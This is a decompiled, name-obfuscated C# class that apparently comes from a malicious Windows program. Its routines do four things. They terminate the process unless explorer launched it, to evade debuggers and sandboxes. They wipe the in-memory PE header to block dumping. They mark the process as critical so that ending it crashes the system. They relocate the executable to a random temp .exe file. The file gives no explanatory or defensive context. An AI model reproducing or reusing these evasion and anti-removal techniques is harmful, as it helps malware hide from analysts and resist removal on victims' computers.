using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace ns0;

public static class GClass0
{
	public static bool Boolean_0
	{
		get
		{
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Expected O, but got Unknown
			ManagementObject val = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id + "'");
			try
			{
				val.Get();
				if (Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)val).get_Item("ParentProcessId"))).ProcessName.ToLower() != "explorer")
				{
					return false;
				}
				return true;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
	}

	public static void smethod_0()
	{
		if (Class1.bool_5)
		{
			smethod_1();
		}
		if (Class1.bool_6 && !Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
		}
		if (Class1.bool_7)
		{
			smethod_2();
		}
	}

	public static void smethod_1()
	{
		try
		{
			IntPtr moduleHandle = Class4.GetModuleHandle(null);
			Class4.VirtualProtect(moduleHandle, 512u, 4u, out var _);
			Class4.RtlZeroMemory(moduleHandle, (IntPtr)512);
		}
		catch
		{
		}
	}

	public static void smethod_2()
	{
		try
		{
			int int_ = 1;
			Class4.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_, 4);
		}
		catch
		{
		}
	}

	public static void smethod_3()
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			File.Delete(tempFileName);
			tempFileName = tempFileName.Replace(".tmp", ".exe");
			File.Move(Process.GetCurrentProcess().MainModule!.FileName, tempFileName);
		}
		catch
		{
		}
	}
}
